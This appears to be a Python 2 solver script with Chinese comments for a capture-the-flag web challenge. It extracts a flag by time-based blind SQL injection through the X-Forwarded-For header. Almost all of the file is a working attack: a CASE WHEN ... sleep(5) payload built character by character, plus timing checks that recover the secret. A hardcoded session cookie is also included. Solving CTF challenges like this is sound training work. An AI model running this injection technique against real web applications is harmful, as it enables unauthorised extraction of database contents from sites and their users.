
#-*-coding:utf-8-*-#基于python2.7
import requests
import string
import time
url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
payloads='abcdefghijklmnopqrstuvwxyz0123456789@_.{}-' 
flag=""
print("Start")  
for i in range(33):  
    for payload in payloads:  
        starttime = time.time()#记录当前时间  
        url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"#题目url  
        headers = {"Host": "ctf5.shiyanbar.com",  
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",  
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
                   "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",  
                   "Accept-Encoding": "gzip, deflate",  
                   "Cookie": "Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1470994390,1470994954,1470995086,1471487815; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*67928%2CnickName%3Ayour",  
                   "Connection": "keep-alive",  
                   "X-FORWARDED-FOR":"127.0.0.1' and case when ((select count(flag) from flag where flag like '"+flag+payload+"%')>0) then sleep(5) else sleep(0) end and '1'='1"  
                   }  
        #bp拿到header并对X-FORWARDED-FOR进行修改，后面语句大意为从flag中选择出flag，若首字母段为flag，payload变量拼接则sleep5秒,看不懂的可以学一下case when语句和like %语句  
        res = requests.get(url, headers=headers)  
        if time.time() - starttime > 5:  
            starttime2 = time.time()  
            res = requests.get(url, headers=headers)  
            if time.time() - starttime > 5:  
                flag += payload  
                print("flag is:%s"%flag)  
                break  
        else:  
            pass
            #print('',)#没啥解释的了，就是不断试payload，找到就接到flag上去然后继续试下一个  
print('\n[Finally] current flag is %s' % flag) 